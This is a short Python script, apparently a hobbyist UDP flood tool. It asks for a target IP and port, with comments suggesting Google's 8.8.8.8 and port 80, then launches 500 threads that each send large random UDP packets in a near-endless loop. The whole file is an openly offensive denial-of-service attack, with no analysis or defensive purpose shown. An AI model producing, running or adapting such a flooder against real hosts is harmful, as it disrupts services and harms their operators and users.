import socket, random, time, threading

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ip = input("Enter targeted ip: ") # 8.8.8.8 google.com
try:
    while(True):
        port = int(input("Enter targeted port: ")) # 80 http
        sleep = float(input("Sleep: ")) # 0.5 is the best possible choice i used so far
        if port < 0 or sleep < 0:
            continue
        else:
            break
except:
    print("enter an integer nothing else!")

def worker():
    for i in range(1,100**1000):
        s.send(random._urandom(10)*1000)
        print(f"Send {i}", end="\r")

thread_list = []
def run():
    try:
        s.connect((ip, port)) #udp not tcp
    except:
        print("Either the port is closed or the ip is wrong!")
        return
    #print(random._urandom(10)*1000) urandom creates random bytes in hexadecimal

    for t in range(500):
        thread = threading.Thread(target=worker) # i pointed the target function to the worker function instead of calling it
        thread_list.append(thread)

    for thread in thread_list:
        thread.start() # here the programs start launching the 500 threads

    for thread in thread_list:
        thread.join() # it doesn't join the thread until it finishes it work (it's like an indication of stopping)
    

